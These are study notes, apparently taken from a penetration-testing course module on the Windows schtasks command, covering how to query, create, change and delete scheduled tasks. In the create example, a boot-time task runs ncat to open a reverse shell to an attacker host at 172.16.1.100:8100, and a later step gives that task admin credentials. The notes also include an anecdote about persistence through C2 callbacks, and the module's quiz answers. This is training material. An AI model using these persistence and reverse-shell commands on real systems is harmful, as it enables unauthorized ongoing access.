### Introduction
- Scheduled tasks are an excellent way for administrators to ensure that tasks they want to run regularly happen, but they are also an excellent persistence point for attackers. In this section, we will discuss using schtasks to:
	- Learn how to check what tasks exist.
	- Create a new task to help us automate actions or acquire a shell on the host.



### What Are Scheduled Tasks?
- The Task Scheduler allows us as admins to perform routine tasks without having to kick them off manually. 
- The scheduler will monitor the host for a specific set of conditions called triggers and execute the task once the conditions are met.

> **Story Time: On several engagements, while pentesting an enterprise environment, I have been in a position where I landed on a host and needed a quick way to set persistence. Instead of doing anything crazy or pulling down another executable onto the host, I decided to search for or create a scheduled task that runs when a user logs in or the host reboots. In this scheduled task, I would set a trigger to open a new socket utilizing PowerShell, reaching out to my Command and Control infrastructure. This would ensure that I could get back in if I lost access to this host. If I were lucky, when the task I chose ran, I might also receive a SYSTEM-level shell back, elevating my privileges at the same time. It quickly ensured host access without setting off alarms with antivirus or data loss prevention systems.**

- #### Triggers That Can Kick Off a Scheduled Task
	- When a specific system event occurs.
	- At a specific time.
	- At a specific time on a daily schedule.
	- At a specific time on a weekly schedule.
	- At a specific time on a monthly schedule.
	- At a specific time on a monthly day-of-week schedule.
	- When the computer enters an idle state.
	- When the task is registered.
	- When the system is booted.
	- When a user logs on.
	- When a Terminal Server session changes state.
- This list of triggers is extensive and gives us many options for having a task take action. 
- Now that we know what scheduled tasks are and what can make them actionable, it is time to look at using them.



### How to Utilize Schtasks
- In the sections provided below, we will go over exactly how we can utilize the `schtasks` command to its fullest extent. 
- Additionally, as we go over them in greater detail, a formatted table providing the syntax for each action will be provided.
- Note that the sections provided here are not an end-all-be-all. 
- Several of the repetitive parameters have been omitted. 
- Be sure to check the help menu `/?` to see a complete list of what can be used.
- #### Display Scheduled Tasks:
- #### Query Syntax
![[Screenshot_20241110_202211.png]]
- We can view the tasks that already exist on our host by utilizing the `schtasks` command like so.
```cmd-session
C:\htb> SCHTASKS /Query /V /FO list

Folder: \  
HostName:                             DESKTOP-Victim
TaskName:                             \Check Network Access
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-Victim\htb-admin
Task To Run:                          C:\Windows\System32\cmd.exe ping 8.8.8.8
Start In:                             N/A
Comment:                              quick ping check to determine connectivity. If it passes, other tasks will kick off. If it fails, they will delay.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          tru7h
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

<SNIP>
```
- Chaining our parameters with `Query` allows us to format our output from the standard bulk into a list with advanced settings.
- The above output shows how the tasks would look in a list format.
- #### Create a New Scheduled Task:
	- #### Create Syntax
![[Screenshot_20241110_202241.png]]
- Creating a new scheduled task is pretty straightforward. 
- At a minimum, we must specify the following:
	- `/create` : to tell it what we are doing
	- `/sc` : we must set a schedule
	- `/tn` : we must set the name
	- `/tr` : we must give it an action to take
- Everything else is optional. 
- Let us see an example below of how we could create a task to help us get a shell.



### New Task Creation
```cmd-session
C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

SUCCESS: The scheduled task "My Secret Task" has successfully been created.
```

> **A great example of a use for schtasks would be providing us with a callback every time the host boots up. This would ensure that if our shell dies, we will get a callback from the host the next time a reboot occurs, making it likely that we will only lose access to the host for a short time if something happens or the host is shut down. We can create or modify a new task by adding a new trigger and action. In our task above, we have schtasks execute Ncat locally, which we placed in the user's AppData directory, and connect to the host `172.16.1.100` on port `8100`. If successfully executed, this connection request should connect to our command and control framework (Metasploit, Empire, etc.) and give us shell access.**

- Now let us look at what modifying a task would look like.



### Change the Properties of a Scheduled Task
- #### Change Syntax
![[Screenshot_20241110_202337.png]]
- Ok, now let us say we found the `hash` of the local admin password and want to use it to spawn our Ncat shell for us; if anything happens, we can modify the task like so to add in the credentials for it to use.
```cmd-session
C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
```
- Now to make sure our changes took, we can query for the specific task using the `/tn` parameter and see.
```cmd-session
C:\htb> schtasks /query /tn "My Secret Task" /V /fo list 

Folder: \
HostName:                             DESKTOP-Victim
TaskName:                             \My Secret Task
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-victim\htb-admin
Task To Run:                          C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up

<SNIP>  
```
- It looks like our changes were saved successfully. 
- Managing tasks and making changes is pretty simple. 
- We need to ensure our syntax is correct, or it may not fire.
- If we want to ensure it works, we can use the `/run` parameter to kick the task off immediately. 
- We have `queried, created, and changed` tasks up to this point. 
- Let us look at how to delete them now.
- #### Delete the Scheduled Task(s)
	- #### Delete Syntax
![[Screenshot_20241110_202422.png]]
```cmd-session
C:\htb> schtasks /delete  /tn "My Secret Task" 

WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
```
- Running `schtasks /delete` is simple enough. 
- The thing to note is that if we do not supply the `/F` option, we will be prompted, like in the example above, for you to supply input. 
- Using `/F` will delete the task and suppress the message.
- Schtasks can be a great way to leverage the host to run actions for us as admins and pentesters. 
- Take some time to practice creating, modifying, and deleting tasks. 
- By now, we should be comfortable with `cmd.exe` and its workings. Let's level up and start working in `PowerShell`!



### Questions
- True or False: A scheduled task can be set to run when a user logs onto a host?
	- True
- Access the target host and take some time to practice working with Scheduled Tasks. Type COMPLETE as the answer when you are ready to move on.
	- Complete